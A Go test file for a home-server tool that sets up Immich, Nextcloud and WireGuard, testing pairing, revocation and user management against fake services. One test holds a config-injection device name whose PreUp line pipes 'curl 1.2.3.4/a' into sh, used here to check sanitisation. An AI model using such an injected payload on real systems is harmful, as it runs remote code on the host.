package core

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/FenOps/immcloudscale/server/internal/stack"
	"github.com/FenOps/immcloudscale/server/internal/state"
	"github.com/FenOps/immcloudscale/server/internal/wg"
)

// fakeServices mimics the Immich and Nextcloud endpoints the server uses.
type fakeServices struct {
	mu      sync.Mutex
	admin   *struct{ email, pass string }
	users   map[string]string // immich email -> password
	keys    map[string]string // key id -> owner email
	ncUsers map[string]string // nextcloud user -> password
	appPass map[string]string // app password -> user
	nextID  int
}

func (f *fakeServices) id() string { f.nextID++; return "id" + string(rune('a'+f.nextID)) }

func (f *fakeServices) immich() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/server/ping", func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, `{"res":"pong"}`) })
	mux.HandleFunc("POST /api/auth/admin-sign-up", func(w http.ResponseWriter, r *http.Request) {
		var b map[string]string
		json.NewDecoder(r.Body).Decode(&b)
		f.mu.Lock()
		defer f.mu.Unlock()
		if f.admin != nil {
			http.Error(w, `{"message":"The server already has an admin"}`, 400)
			return
		}
		f.admin = &struct{ email, pass string }{b["email"], b["password"]}
		f.users[b["email"]] = b["password"]
		w.WriteHeader(201)
	})
	mux.HandleFunc("POST /api/auth/login", func(w http.ResponseWriter, r *http.Request) {
		var b map[string]string
		json.NewDecoder(r.Body).Decode(&b)
		f.mu.Lock()
		defer f.mu.Unlock()
		if p, ok := f.users[b["email"]]; !ok || p != b["password"] {
			http.Error(w, `{"message":"Incorrect email or password"}`, 401)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"accessToken": "tok:" + b["email"]})
	})
	who := func(r *http.Request) string { return strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer tok:") }
	mux.HandleFunc("POST /api/admin/users", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		if f.admin == nil || who(r) != f.admin.email {
			http.Error(w, `{"message":"Invalid user token"}`, 401)
			return
		}
		var b map[string]any
		json.NewDecoder(r.Body).Decode(&b)
		f.users[b["email"].(string)] = b["password"].(string)
		json.NewEncoder(w).Encode(map[string]string{"id": "u-" + b["name"].(string), "email": b["email"].(string)})
	})
	mux.HandleFunc("PUT /api/admin/users/{id}", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		if f.admin == nil || who(r) != f.admin.email {
			http.Error(w, `{"message":"Forbidden"}`, 403)
			return
		}
		var b map[string]any
		json.NewDecoder(r.Body).Decode(&b)
		name := strings.TrimPrefix(r.PathValue("id"), "u-")
		for e := range f.users {
			if strings.HasPrefix(e, name+"@") {
				f.users[e] = b["password"].(string)
			}
		}
		io.WriteString(w, `{}`)
	})
	mux.HandleFunc("DELETE /api/admin/users/{id}", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		name := strings.TrimPrefix(r.PathValue("id"), "u-")
		for e := range f.users {
			if strings.HasPrefix(e, name+"@") {
				delete(f.users, e)
			}
		}
		w.WriteHeader(200)
	})
	mux.HandleFunc("GET /api/server/storage", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		if _, ok := f.users[who(r)]; !ok {
			http.Error(w, `{"message":"Invalid user token"}`, 401)
			return
		}
		io.WriteString(w, `{"diskSize":"1 TiB","diskUse":"1 GiB","diskUsagePercentage":0.1}`)
	})
	mux.HandleFunc("POST /api/api-keys", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		id := f.id()
		f.keys[id] = who(r)
		json.NewEncoder(w).Encode(map[string]any{"secret": "secret-" + id, "apiKey": map[string]string{"id": id}})
	})
	mux.HandleFunc("DELETE /api/api-keys/{id}", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		delete(f.keys, r.PathValue("id"))
		w.WriteHeader(204)
	})
	return mux
}

func ocsOK(w http.ResponseWriter, data any) {
	json.NewEncoder(w).Encode(map[string]any{"ocs": map[string]any{"meta": map[string]any{"status": "ok", "statuscode": 100}, "data": data}})
}

func (f *fakeServices) nextcloud() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /status.php", func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, `{"installed":true,"maintenance":false}`)
	})
	mux.HandleFunc("POST /ocs/v1.php/cloud/users", func(w http.ResponseWriter, r *http.Request) {
		u, p, _ := r.BasicAuth()
		f.mu.Lock()
		defer f.mu.Unlock()
		if u != ncAdmin || p != "ncadmin" || r.Header.Get("OCS-APIRequest") != "true" {
			w.WriteHeader(401)
			ocsOK(w, nil)
			return
		}
		r.ParseForm()
		f.ncUsers[r.Form.Get("userid")] = r.Form.Get("password")
		ocsOK(w, map[string]string{"id": r.Form.Get("userid")})
	})
	mux.HandleFunc("GET /ocs/v1.php/cloud/users/{u}", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		if _, ok := f.ncUsers[r.PathValue("u")]; !ok {
			json.NewEncoder(w).Encode(map[string]any{"ocs": map[string]any{"meta": map[string]any{"statuscode": 404, "message": "User does not exist"}}})
			return
		}
		ocsOK(w, map[string]string{"id": r.PathValue("u")})
	})
	mux.HandleFunc("DELETE /ocs/v1.php/cloud/users/{u}", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		delete(f.ncUsers, r.PathValue("u"))
		ocsOK(w, nil)
	})
	mux.HandleFunc("GET /ocs/v2.php/core/getapppassword", func(w http.ResponseWriter, r *http.Request) {
		u, p, _ := r.BasicAuth()
		f.mu.Lock()
		defer f.mu.Unlock()
		if f.ncUsers[u] != p {
			json.NewEncoder(w).Encode(map[string]any{"ocs": map[string]any{"meta": map[string]any{"statuscode": 401, "message": "bad"}}})
			return
		}
		ap := "app-" + f.id()
		f.appPass[ap] = u
		json.NewEncoder(w).Encode(map[string]any{"ocs": map[string]any{"meta": map[string]any{"statuscode": 200}, "data": map[string]string{"apppassword": ap}}})
	})
	mux.HandleFunc("DELETE /ocs/v2.php/core/apppassword", func(w http.ResponseWriter, r *http.Request) {
		_, p, _ := r.BasicAuth()
		f.mu.Lock()
		defer f.mu.Unlock()
		delete(f.appPass, p)
		json.NewEncoder(w).Encode(map[string]any{"ocs": map[string]any{"meta": map[string]any{"statuscode": 200}}})
	})
	return mux
}

type fakeDocker struct {
	ups   int
	execs []string
}

func (d *fakeDocker) Up(string) error        { d.ups++; return nil }
func (d *fakeDocker) Pull(string) error      { return nil }
func (d *fakeDocker) HaveImages(string) bool { return true }
func (d *fakeDocker) Services(string) ([]stack.Service, error) {
	return []stack.Service{{Name: "immich-server", State: "running"}}, nil
}
func (d *fakeDocker) Exec(_, _, _ string, args ...string) (string, error) {
	d.execs = append(d.execs, strings.Join(args, " "))
	return "", nil
}

type fakeWG struct{ last wg.ServerConfig }

func (f *fakeWG) Apply(c wg.ServerConfig) error { f.last = c; return nil }
func (f *fakeWG) Status(string) ([]wg.PeerStatus, error) {
	var out []wg.PeerStatus
	for _, p := range f.last.Peers {
		out = append(out, wg.PeerStatus{PublicKey: p.PublicKey, LastHandshake: time.Now(), RxBytes: 10})
	}
	return out, nil
}

func newTestServer(t *testing.T) (*Server, *fakeServices, *fakeWG) {
	t.Helper()
	f := &fakeServices{users: map[string]string{}, keys: map[string]string{}, ncUsers: map[string]string{}, appPass: map[string]string{}}
	im := httptest.NewServer(f.immich())
	nc := httptest.NewServer(f.nextcloud())
	t.Cleanup(im.Close)
	t.Cleanup(nc.Close)
	dir := t.TempDir()
	st, err := state.Open(filepath.Join(dir, "state.json"))
	if err != nil {
		t.Fatal(err)
	}
	// Fixed Nextcloud admin password so the fake can check it.
	st.Update(func(s *state.State) error { s.Config.NCAdminPassword = "ncadmin"; return nil })
	w := &fakeWG{}
	s := &Server{
		Store: st, Docker: &fakeDocker{}, WG: w,
		ImmichURL:    func(state.Config) string { return im.URL },
		NextcloudURL: func(state.Config) string { return nc.URL },
		Now:          time.Now, Log: log.New(io.Discard, "", 0), WaitTimeout: 5 * time.Second,
	}
	err = s.Setup(context.Background(), SetupOptions{
		DataDir: filepath.Join(dir, "data"), StackDir: filepath.Join(dir, "stack"), LANAddress: "192.168.1.50",
		LANSubnet: "192.168.1.0/24", EgressIface: "eth0", Endpoint: "home.example.org", FirstUser: "camille", FirstEmail: "camille@example.com",
	})
	if err != nil {
		t.Fatal(err)
	}
	return s, f, w
}

func TestSetupCreatesOwnerEverywhere(t *testing.T) {
	s, f, w := newTestServer(t)
	st := s.Store.Read()
	if len(st.Users) != 1 || !st.Users[0].IsAdmin || st.Users[0].ImmichID != "u-camille" {
		t.Fatalf("%+v", st.Users)
	}
	if f.ncUsers["camille"] != st.Users[0].Password || f.users["camille@example.com"] != st.Users[0].Password {
		t.Fatal("owner should have the same password on Immich and Nextcloud")
	}
	if w.last.Interface != "ics0" || w.last.Port != 51820 || w.last.Egress != "eth0" || !wg.ValidKey(w.last.PrivateKey) {
		t.Fatalf("%+v", w.last)
	}
	// Running setup again keeps secrets and users.
	before := st.Config.DBPassword
	if err := s.Setup(context.Background(), SetupOptions{}); err != nil {
		t.Fatal(err)
	}
	if after := s.Store.Read(); after.Config.DBPassword != before || len(after.Users) != 1 {
		t.Fatal("re-running setup must be idempotent")
	}
}

func TestPairAndRevoke(t *testing.T) {
	s, f, w := newTestServer(t)
	ctx := context.Background()
	_, phonePub, _ := wg.NewKeyPair()

	p, err := s.StartPairing("camille")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.Pair(ctx, PairRequest{Code: "ZZZZ-ZZZZ"}); err != ErrBadCode {
		t.Fatalf("got %v", err)
	}
	// Codes are accepted without the dash and in lower case.
	res, err := s.Pair(ctx, PairRequest{Code: strings.ToLower(strings.ReplaceAll(p.Code, "-", "")), DeviceName: "Pixel 9", WGPublicKey: phonePub})
	if err != nil {
		t.Fatal(err)
	}
	if res.Immich.URL != "http://192.168.1.50:2283" || !strings.HasPrefix(res.Immich.APIKey, "secret-") {
		t.Fatalf("%+v", res.Immich)
	}
	if res.Nextcloud.URL != "http://192.168.1.50:8080" || f.appPass[res.Nextcloud.AppPassword] != "camille" {
		t.Fatalf("%+v", res.Nextcloud)
	}
	if res.WireGuard == nil || res.WireGuard.Address != "10.8.0.2/32" || res.WireGuard.Endpoint != "home.example.org:51820" ||
		res.WireGuard.AllowedIPs != "10.8.0.0/24, 192.168.1.0/24" || res.WireGuard.ServerPublicKey != s.Store.Read().Config.WGPublicKey {
		t.Fatalf("%+v", res.WireGuard)
	}
	if len(w.last.Peers) != 1 || w.last.Peers[0].PublicKey != phonePub || w.last.Peers[0].Address != "10.8.0.2" {
		t.Fatalf("%+v", w.last.Peers)
	}
	// Single use.
	if _, err := s.Pair(ctx, PairRequest{Code: p.Code}); err != ErrBadCode {
		t.Fatal("code reused")
	}
	// The same phone key can't be paired twice; a second phone gets the next address.
	p2, _ := s.StartPairing("camille")
	if _, err := s.Pair(ctx, PairRequest{Code: p2.Code, WGPublicKey: phonePub}); err == nil {
		t.Fatal("duplicate key accepted")
	}
	if len(f.keys) != 1 || len(f.appPass) != 1 {
		t.Fatalf("failed pairing must clean up its credentials: keys=%d app=%d", len(f.keys), len(f.appPass))
	}
	_, pub2, _ := wg.NewKeyPair()
	p3, _ := s.StartPairing("camille")
	res2, err := s.Pair(ctx, PairRequest{Code: p3.Code, WGPublicKey: pub2})
	if err != nil || res2.WireGuard.Address != "10.8.0.3/32" {
		t.Fatalf("%v %+v", err, res2.WireGuard)
	}

	stat := s.Status(ctx)
	if len(stat.Devices) != 2 || !stat.Devices[0].Online || stat.Devices[0].NCAppPassword != "" {
		t.Fatalf("status must show online devices and hide app passwords: %+v", stat.Devices)
	}

	if err := s.Revoke(ctx, res.DeviceID); err != nil {
		t.Fatal(err)
	}
	if len(f.keys) != 1 || f.appPass[res.Nextcloud.AppPassword] != "" || len(w.last.Peers) != 1 || w.last.Peers[0].PublicKey != pub2 {
		t.Fatal("revoke must remove the API key, app password and VPN peer")
	}
}

func TestPairingExpires(t *testing.T) {
	s, _, _ := newTestServer(t)
	now := time.Now()
	s.Now = func() time.Time { return now }
	p, _ := s.StartPairing("camille")
	s.Now = func() time.Time { return now.Add(PairingTTL + time.Second) }
	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code}); err != ErrBadCode {
		t.Fatal("expired code accepted")
	}
	if _, err := s.StartPairing("nobody"); err == nil {
		t.Fatal("pairing for unknown user")
	}
}

func TestUsers(t *testing.T) {
	s, f, _ := newTestServer(t)
	ctx := context.Background()
	if _, err := s.AddUser(ctx, "Bad Name!", "", false); err == nil {
		t.Fatal("invalid name accepted")
	}
	if _, err := s.AddUser(ctx, "ics-admin", "", false); err == nil {
		t.Fatal("reserved name accepted")
	}
	u, err := s.AddUser(ctx, "alex", "", false)
	if err != nil || u.Email != "alex@immcloudscale.local" || f.ncUsers["alex"] == "" {
		t.Fatalf("%v %+v", err, u)
	}
	if _, err := s.AddUser(ctx, "alex", "", false); err == nil {
		t.Fatal("duplicate user")
	}
	_, pub, _ := wg.NewKeyPair()
	p, _ := s.StartPairing("alex")
	if _, err := s.Pair(ctx, PairRequest{Code: p.Code, WGPublicKey: pub}); err != nil {
		t.Fatal(err)
	}
	if err := s.RemoveUser(ctx, "alex"); err != nil {
		t.Fatal(err)
	}
	st := s.Store.Read()
	if st.FindUser("alex") != nil || len(st.Devices) != 0 || f.ncUsers["alex"] != "" || len(f.keys) != 0 {
		t.Fatal("removing a user must remove their devices and accounts")
	}
}

func TestNoVPNMode(t *testing.T) {
	s, _, w := newTestServer(t)
	off := false
	if err := s.Setup(context.Background(), SetupOptions{VPN: &off}); err != nil {
		t.Fatal(err)
	}
	w.last = wg.ServerConfig{}
	_, pub, _ := wg.NewKeyPair()
	p, _ := s.StartPairing("camille")
	res, err := s.Pair(context.Background(), PairRequest{Code: p.Code, WGPublicKey: pub})
	if err != nil || res.WireGuard != nil || w.last.Interface != "" {
		t.Fatalf("with the VPN off, pairing must not create peers: %v %+v", err, res.WireGuard)
	}
}

func TestHostOnly(t *testing.T) {
	for in, want := range map[string]string{"a.example:51820": "a.example", "1.2.3.4": "1.2.3.4", "[2001:db8::1]:51820": "[2001:db8::1]", "2001:db8::1": "2001:db8::1"} {
		if got := hostOnly(in); got != want {
			t.Errorf("%s: %s", in, got)
		}
	}
}

func TestBusyPortsAreSkipped(t *testing.T) {
	s := &Server{Log: log.New(io.Discard, "", 0), PortFree: func(p int, udp bool) bool { return p != 8080 && p != 8081 }}
	if got := s.freePort(8080, false, nil); got != 8082 {
		t.Fatalf("got %d", got)
	}
	if got := s.freePort(2283, false, map[int]bool{2283: true}); got != 2284 {
		t.Fatalf("already-chosen ports must be skipped, got %d", got)
	}
	if !PortFree(0, false) {
		t.Fatal("port 0 (any) should always bind")
	}
}

func TestDeviceNameInjectionIsNeutralised(t *testing.T) {
	s, _, w := newTestServer(t)
	_, pub, _ := wg.NewKeyPair()
	p, _ := s.StartPairing("camille")
	evil := "x\n[Interface]\nPreUp=curl 1.2.3.4/a|sh\n[Peer]"
	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code, DeviceName: evil, WGPublicKey: pub}); err != nil {
		t.Fatal(err)
	}
	name := w.last.Peers[0].Name
	if strings.ContainsAny(name, "\n\r[]#=") {
		t.Fatalf("unsafe device name stored: %q", name)
	}
	cfg, _ := w.last.Render()
	if strings.Count(cfg, "[Interface]") != 1 || strings.Contains(cfg, "\nPreUp") || strings.Contains(cfg, "\n[Peer]\n[") {
		t.Fatalf("config was injected:\n%s", cfg)
	}
	if got := SanitizeDeviceName(strings.Repeat("é", 80)); len([]rune(got)) != 60 {
		t.Fatalf("names must be cut by characters, got %d", len([]rune(got)))
	}
}

func TestCodeIsGivenBackWhenTheServerFails(t *testing.T) {
	s, f, _ := newTestServer(t)
	p, _ := s.StartPairing("camille")
	// A bad key is refused without using up the code.
	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code, WGPublicKey: "nope"}); err == nil {
		t.Fatal("bad key accepted")
	}
	// Nextcloud refusing (here: wrong stored password) is our failure: the code must survive.
	f.mu.Lock()
	f.ncUsers["camille"] = "changed"
	f.mu.Unlock()
	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code}); err == nil || err == ErrBadCode {
		t.Fatalf("expected a server-side error, got %v", err)
	}
	if len(f.keys) != 0 {
		t.Fatal("the Immich key from the failed attempt must be deleted")
	}
	f.mu.Lock()
	f.ncUsers["camille"] = s.Store.Read().Users[0].Password
	f.mu.Unlock()
	if _, err := s.Pair(context.Background(), PairRequest{Code: p.Code}); err != nil {
		t.Fatalf("the code should still work after a server-side failure: %v", err)
	}
}

func TestRevokeRecoversFromChangedPasswordAndReportsFailures(t *testing.T) {
	s, f, _ := newTestServer(t)
	ctx := context.Background()
	p, _ := s.StartPairing("camille")
	res, err := s.Pair(ctx, PairRequest{Code: p.Code})
	if err != nil {
		t.Fatal(err)
	}
	// The person changed their Immich password in the web UI.
	f.mu.Lock()
	f.users["camille@example.com"] = "their-new-password"
	f.mu.Unlock()
	if err := s.Revoke(ctx, res.DeviceID); err != nil {
		t.Fatalf("revoke should reset the password and succeed: %v", err)
	}
	if len(f.keys) != 0 {
		t.Fatal("the phone's Immich key must be deleted")
	}
	// If Immich is unreachable, the phone stays listed and the admin is told.
	p2, _ := s.StartPairing("camille")
	res2, _ := s.Pair(ctx, PairRequest{Code: p2.Code})
	s.ImmichURL = func(state.Config) string { return "http://127.0.0.1:1" }
	s.tok = ""
	if err := s.Revoke(ctx, res2.DeviceID); err == nil {
		t.Fatal("a failed revoke must be reported")
	}
	if len(s.Store.Read().Devices) != 1 {
		t.Fatal("the phone must stay listed so the admin can retry")
	}
}

func TestRerunKeepsChoicesAndRemoveUserPurgesPairings(t *testing.T) {
	s, _, _ := newTestServer(t)
	ctx := context.Background()
	off := false
	if err := s.Setup(ctx, SetupOptions{MachineLearning: &off}); err != nil {
		t.Fatal(err)
	}
	if err := s.Setup(ctx, SetupOptions{}); err != nil {
		t.Fatal(err)
	}
	if s.Store.Read().Config.MachineLearning {
		t.Fatal("re-running setup without flags must keep smart search off")
	}
	if !s.Store.Read().Config.VPNEnabled {
		t.Fatal("the VPN should stay on")
	}
	if d := s.Docker.(*fakeDocker); len(d.execs) == 0 || !strings.Contains(d.execs[0], "trusted_domains 0") {
		t.Fatalf("setup must re-apply Nextcloud trusted addresses, got %v", d.execs)
	}
	if _, err := s.AddUser(ctx, "sam", "", false); err != nil {
		t.Fatal(err)
	}
	if _, err := s.StartPairing("sam"); err != nil {
		t.Fatal(err)
	}
	if err := s.RemoveUser(ctx, "sam"); err != nil {
		t.Fatal(err)
	}
	for _, p := range s.Store.Read().Pairings {
		if p.User == "sam" {
			t.Fatal("pending pairing codes of a removed user must go too")
		}
	}
}

func TestRepairingRetiresTheOldEntry(t *testing.T) {
	s, f, _ := newTestServer(t)
	ctx := context.Background()
	p1, _ := s.StartPairing("camille")
	first, err := s.Pair(ctx, PairRequest{Code: p1.Code})
	if err != nil {
		t.Fatal(err)
	}
	p2, _ := s.StartPairing("camille")
	if _, err := s.Pair(ctx, PairRequest{Code: p2.Code, ReplacesDevice: first.DeviceID}); err != nil {
		t.Fatal(err)
	}
	if n := len(s.Store.Read().Devices); n != 1 {
		t.Fatalf("the old entry must be retired, %d devices left", n)
	}
	if len(f.keys) != 1 || f.appPass[first.Nextcloud.AppPassword] != "" {
		t.Fatal("the old entry's credentials must be revoked")
	}
}

func TestEmailsAreCheckedUpFront(t *testing.T) {
	s, _, _ := newTestServer(t)
	ctx := context.Background()
	if _, err := s.AddUser(ctx, "erin", "Erin <erin@x.org>", false); err == nil {
		t.Fatal("display-name emails must be refused before reaching Immich")
	}
	if _, err := s.AddUser(ctx, "carol", "CAMILLE@example.com", false); err == nil || !strings.Contains(err.Error(), "already used by camille") {
		t.Fatalf("got %v", err)
	}
}

func TestTurningTheVPNOnLaterSkipsPhonesWithoutKeys(t *testing.T) {
	s, _, w := newTestServer(t)
	ctx := context.Background()
	off, on := false, true
	if err := s.Setup(ctx, SetupOptions{VPN: &off}); err != nil {
		t.Fatal(err)
	}
	_, pub, _ := wg.NewKeyPair()
	p, _ := s.StartPairing("camille")
	if _, err := s.Pair(ctx, PairRequest{Code: p.Code, WGPublicKey: pub}); err != nil {
		t.Fatal(err)
	}
	if err := s.Setup(ctx, SetupOptions{VPN: &on}); err != nil {
		t.Fatalf("switching the VPN back on must work with phones paired without it: %v", err)
	}
	if _, err := w.last.Render(); err != nil {
		t.Fatalf("the VPN config must still render: %v", err)
	}
	if len(w.last.Peers) != 0 {
		t.Fatalf("phones without a VPN key get no peer, got %+v", w.last.Peers)
	}
}

func TestEndpointFollowsTheLANAddressWhenNoPublicAddressIsKnown(t *testing.T) {
	s, _, _ := newTestServer(t)
	ctx := context.Background()
	s.Store.Update(func(st *state.State) error {
		st.Config.Endpoint, st.Config.LANManual = st.Config.LANAddress, false
		return nil
	})
	if err := s.Setup(ctx, SetupOptions{DetectedLAN: "192.168.1.60"}); err != nil {
		t.Fatal(err)
	}
	c := s.Store.Read().Config
	if c.LANAddress != "192.168.1.60" || c.Endpoint != "192.168.1.60" {
		t.Fatalf("lan=%s endpoint=%s", c.LANAddress, c.Endpoint)
	}
	// A hand-set address stays, whatever is detected later.
	if err := s.Setup(ctx, SetupOptions{LANAddress: "10.0.0.5"}); err != nil {
		t.Fatal(err)
	}
	if err := s.Setup(ctx, SetupOptions{DetectedLAN: "192.168.1.70"}); err != nil {
		t.Fatal(err)
	}
	if got := s.Store.Read().Config.LANAddress; got != "10.0.0.5" {
		t.Fatalf("hand-set LAN address was replaced by %s", got)
	}
}

func TestRejectedAdminSessionIsRenewed(t *testing.T) {
	s, _, _ := newTestServer(t)
	ctx := context.Background()
	s.tokMu.Lock()
	s.tok, s.tokUntil, s.tokChecked = "stale-token", s.Now().Add(time.Hour), time.Time{}
	s.tokMu.Unlock()
	if _, err := s.AddUser(ctx, "sam", "", false); err != nil {
		t.Fatalf("a rejected cached session must be replaced: %v", err)
	}
	if s.tok == "stale-token" {
		t.Fatal("token not renewed")
	}
}

func TestRemoveUserKeepsThePersonWhenNextcloudStillHasThem(t *testing.T) {
	s, f, _ := newTestServer(t)
	ctx := context.Background()
	if _, err := s.AddUser(ctx, "sam", "", false); err != nil {
		t.Fatal(err)
	}
	s.NextcloudURL = func(state.Config) string { return "http://127.0.0.1:1" } // Nextcloud unreachable
	if err := s.RemoveUser(ctx, "sam"); err == nil {
		t.Fatal("a failed Nextcloud delete must be reported")
	}
	if st := s.Store.Read(); st.FindUser("sam") == nil {
		t.Fatal("the person must stay listed so the admin can retry")
	}
	_ = f
}

func TestPairForARemovedPersonIsRefused(t *testing.T) {
	s, _, _ := newTestServer(t)
	ctx := context.Background()
	if _, err := s.AddUser(ctx, "sam", "", false); err != nil {
		t.Fatal(err)
	}
	p, _ := s.StartPairing("sam")
	// The person disappears from state while the code is still valid (e.g. removed mid-pairing).
	s.Store.Update(func(st *state.State) error {
		st.Users = st.Users[:1]
		return nil
	})
	if _, err := s.Pair(ctx, PairRequest{Code: p.Code}); !errors.Is(err, ErrUserGone) {
		t.Fatalf("got %v", err)
	}
}
